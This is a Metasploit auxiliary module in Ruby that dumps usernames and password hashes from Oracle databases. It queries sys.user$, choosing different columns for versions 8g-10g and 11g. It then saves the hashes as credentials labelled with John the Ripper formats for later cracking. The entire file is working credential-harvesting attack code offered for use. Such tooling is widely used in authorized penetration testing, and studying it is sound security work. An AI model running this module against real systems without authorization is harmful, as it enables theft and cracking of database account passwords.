##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::ORACLE
  include Msf::Auxiliary::Report
  include Msf::Auxiliary::Scanner


  def initialize
    super(
      'Name'           => 'Oracle Password Hashdump',
      'Description'    => %Q{
          This module dumps the usernames and password hashes
          from Oracle given the proper Credentials and SID.
          These are then stored as creds for later cracking.
      },
      'Author'         => ['theLightCosine'],
      'License'        => MSF_LICENSE
    )
  end

  def run_host(ip)
    return if not check_dependencies

    # Checks for Version of Oracle, 8g-10g all behave one way, while 11g behaves differently
    # Also, 11g uses SHA-1 while 8g-10g use DES
    is_11g=false
    query =  'select * from v$version'
    ver = prepare_exec(query)

    if ver.nil?
      print_error("An Error has occurred, check your OPTIONS")
      return
    end

    unless ver.empty?
      if ver[0].include?('11g')
        is_11g=true
        print_status("Server is running 11g, using newer methods...")
      end
    end

    this_service = report_service(
          :host  => datastore['RHOST'],
          :port => datastore['RPORT'],
          :name => 'oracle',
          :proto => 'tcp'
          )



    tbl = Rex::Text::Table.new(
      'Header'  => 'Oracle Server Hashes',
      'Indent'   => 1,
      'Columns' => ['Username', 'Hash']
    )

    # Get the usernames and hashes for 8g-10g
    begin
      if is_11g==false
        query='SELECT name, password FROM sys.user$ where password is not null and name<> \'ANONYMOUS\''
        results= prepare_exec(query)
        unless results.empty?
          results.each do |result|
            row= result.split(/,/)
            tbl << row
          end
        end
      # Get the usernames and hashes for 11g
      else
        query='SELECT name, spare4 FROM sys.user$ where password is not null and name<> \'ANONYMOUS\''
        results= prepare_exec(query)
        #print_status("Results: #{results.inspect}")
        unless results.empty?
          results.each do |result|
            row= result.split(/,/)
            next unless row.length == 2
            tbl << row
          end
        end

      end
    rescue => e
      print_error("An error occurred. The supplied credentials may not have proper privs")
      return
    end
    print_status("Hash table :\n #{tbl}")
    report_hashes(tbl, is_11g, ip, this_service)
  end



  def report_hashes(table, is_11g, ip, service)
    # Reports the hashes slightly differently depending on the version
    # This is so that we know which are which when we go to crack them
    if is_11g==false
      jtr_format = "des"
    else
      jtr_format = "raw-sha1"
    end
    service_data = {
      address: Rex::Socket.getaddress(ip),
      port: service[:port],
      protocol: service[:proto],
      service_name: service[:name],
      workspace_id: myworkspace_id
    }

    table.rows.each do |row|
      credential_data = {
        origin_type: :service,
        module_fullname: self.fullname,
        username: row[0],
        private_data: row[1],
        private_type: :nonreplayable_hash,
        jtr_format: jtr_format
      }

      credential_core = create_credential(credential_data.merge(service_data))

      login_data = {
        core: credential_core,
        status: Metasploit::Model::Login::Status::UNTRIED
      }

      create_credential_login(login_data.merge(service_data))
    end
    print_good("Hash Table has been saved")
  end

end
